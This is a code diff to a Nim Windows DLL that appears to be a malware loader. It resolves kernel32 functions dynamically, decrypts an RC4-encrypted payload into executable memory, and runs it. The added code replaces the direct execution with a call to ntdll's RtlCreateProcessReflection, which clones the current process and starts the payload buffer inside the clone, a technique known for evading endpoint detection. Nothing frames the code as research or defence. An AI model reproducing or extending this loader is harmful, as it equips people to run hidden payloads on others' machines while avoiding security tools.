@@ -8,6 +8,7 @@ import std/osproc
 import std/os
 import includes/DLoader
 import includes/rc4
+import winim/com
 
 func toByteSeq*(str: string): seq[byte] {.inline.} =
   ## Converts a string to the corresponding byte sequence.
@@ -21,6 +22,30 @@ elif defined i386:
 # const encContent = slurp("encContent.bin")
 
 var currentModule: HINSTANCE
+
+const
+  RTL_CLONE_PROCESS_FLAGS_CREATE_SUSPENDED = 0x00000001
+  RTL_CLONE_PROCESS_FLAGS_INHERIT_HANDLES = 0x00000002
+  RTL_CLONE_PROCESS_FLAGS_NO_SYNCHRONIZE = 0x00000004
+
+type
+  T_CLIENT_ID = object
+    UniqueProcess: HANDLE
+    UniqueThread: HANDLE
+
+  T_RTLP_PROCESS_REFLECTION_REFLECTION_INFORMATION = object
+    ReflectionProcessHandle: HANDLE
+    ReflectionThreadHandle: HANDLE
+    ReflectionClientId: T_CLIENT_ID
+
+  RtlCreateProcessReflectionFunc = proc(
+    ProcessHandle: HANDLE,
+    Flags: ULONG,
+    StartRoutine: PVOID,
+    StartContext: PVOID,
+    EventHandle: HANDLE,
+    ReflectionInformation: T_RTLP_PROCESS_REFLECTION_REFLECTION_INFORMATION
+  ): NTSTATUS {.stdcall.}
 
 type
     USTRING* = object
@@ -153,6 +178,7 @@ type
     CreateProcessA_t* = proc(lpApplicationName: LPCSTR, lpCommandLine: LPSTR, lpProcessAttributes: LPSECURITY_ATTRIBUTES, lpThreadAttributes: LPSECURITY_ATTRIBUTES, bInheritHandles: WINBOOL, dwCreationFlags: DWORD, lpEnvironment: LPVOID, lpCurrentDirectory: LPCSTR, lpStartupInfo: LPSTARTUPINFOA, lpProcessInformation: LPPROCESS_INFORMATION): WINBOOL {.stdcall.}
     TerminateProcess_t* = proc(hProcess: HANDLE, uExitCode: UINT): WINBOOL {.stdcall.}
 
+
 var 
     VirtualAlloc_p*: VirtualAlloc_t
     VirtualProtect_p*: VirtualProtect_t
@@ -181,6 +207,8 @@ GetProcAddress_p = cast[GetProcAddress_t](cast[LPVOID](get_function_address(cast
 ReadProcessMemory_p = cast[ReadProcessMemory_t](cast[LPVOID](get_function_address(cast[HMODULE](k32Addr), RPM)))
 CreateProcessA_p = cast[CreateProcessA_t](cast[LPVOID](get_function_address(cast[HMODULE](k32Addr), CProc)))
 TerminateProcess_p = cast[TerminateProcess_t](cast[LPVOID](get_function_address(cast[HMODULE](k32Addr), TProc)))
+
+var hNtdll: HMODULE = LoadLibrary_p("ntdll.dll")
 
 proc toString(bytes: openarray[byte]): string =
   result = newString(bytes.len)
@@ -393,8 +421,17 @@ proc execute(): void =
 
     discard VirtualProtect_p(buffer, cast[SIZE_T](myResourceSize), PAGE_EXECUTE_READ, addr oldProtect)
     #echo "VP Called!"
-    let f = cast[proc(){.nimcall.}](buffer)
-    f()
+    var currPID = GetCurrentProcessId()
+
+    var victimHandle: HANDLE = OpenProcess(PROCESS_VM_OPERATION or PROCESS_VM_WRITE or PROCESS_CREATE_THREAD or PROCESS_DUP_HANDLE, TRUE, currPID)
+    
+    var RtlCreateProcessReflection: RtlCreateProcessReflectionFunc = cast[RtlCreateProcessReflectionFunc](GetProcAddress_p(hNtdll, "RtlCreateProcessReflection"))
+    var info: T_RTLP_PROCESS_REFLECTION_REFLECTION_INFORMATION
+
+    var reflectRet: NTSTATUS = RtlCreateProcessReflection(victimHandle, cast[ULONG](RTL_CLONE_PROCESS_FLAGS_INHERIT_HANDLES or RTL_CLONE_PROCESS_FLAGS_NO_SYNCHRONIZE), cast[PVOID](buffer), cast[PVOID](0), cast[HANDLE](0), info)
+    
+    #let f = cast[proc(){.nimcall.}](buffer)
+    #f()
     
 proc DllMain(hinstDLL: HINSTANCE, fdwReason: DWORD, lpvReserved: LPVOID) : BOOL {.stdcall, exportc, dynlib.} =
   if fdwReason == DLL_PROCESS_ATTACH:
